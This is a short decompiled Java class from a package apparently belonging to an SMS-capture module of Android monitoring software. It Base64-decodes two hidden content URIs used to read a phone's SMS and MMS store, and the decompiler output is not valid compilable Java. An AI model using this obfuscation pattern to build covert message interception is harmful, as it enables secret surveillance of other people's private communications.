package com.vvt.capture.sms.b;

import android.net.Uri;
import android.util.Base64;

public class a
{
  public static final Uri a;
  public static final Uri b;
  
  static
  {
    String str = new java/lang/String;
    byte[] arrayOfByte = Base64.decode("Y29udGVudDovL21tcy1zbXM=", 0);
    str.<init>(arrayOfByte);
    a = Uri.parse(str);
    str = new java/lang/String;
    arrayOfByte = Base64.decode("Y29udGVudDovL3Ntcw==", 0);
    str.<init>(arrayOfByte);
    b = Uri.parse(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/sms/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */